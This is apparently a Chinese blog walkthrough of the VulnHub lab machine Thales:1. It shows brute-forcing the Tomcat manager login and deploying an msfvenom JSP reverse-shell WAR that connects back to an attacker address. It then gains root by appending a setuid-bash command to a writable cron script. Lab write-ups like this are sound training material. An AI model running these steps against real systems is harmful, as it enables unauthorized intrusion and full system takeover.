---
title: VulnHub Thales：1
date: 2026-06-08 17:16:00
categories: 
  - VulnHub
tags:
  - 弱口令
  - RCE
  - Python 升级为交互式 Shell
  - 定时任务
---

# Thales: 1

项目地址：https://download.vulnhub.com/thales/Thales.zip

是一个打包好的镜像文件

**注意：导入 ova 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/6a277a083c9809430d390847.png)

## 弱口令

### Tomcat

可以看到 8080 开放了 Tomcat，使用 MSF 爆破

![](https://pic1.imgdb.cn/item/6a277c263c9809430d390a0b.png)

成功爆破出密码

```
tomcat:role1
```

![](https://pic1.imgdb.cn/item/6a277de53c9809430d390ad3.png)

## RCE

### WAR 包部署

登录进去后可以上传 WAR 包

![](https://pic1.imgdb.cn/item/6a277ff23c9809430d390b7c.png)

MSF 生成一个

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.125.4 LPORT=8888 -f war > revshelll.war
```

上传部署后点击

![](https://pic1.imgdb.cn/item/6a27865a3c9809430d39365a.png)

成功拿到 Shell

![](https://pic1.imgdb.cn/item/6a2786753c9809430d393661.png)

## 提权

### Python 升级为交互式 Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### 定时任务

查看提示，这个文件我们可以修改

![](https://pic1.imgdb.cn/item/6a2788bb3c9809430d393763.png)

添加提权命令

```bash
echo "chmod u+s /bin/bash" >> /usr/local/bin/backup.sh
```

等待一段时间后提权即可

```bash
/bin/bash -p
```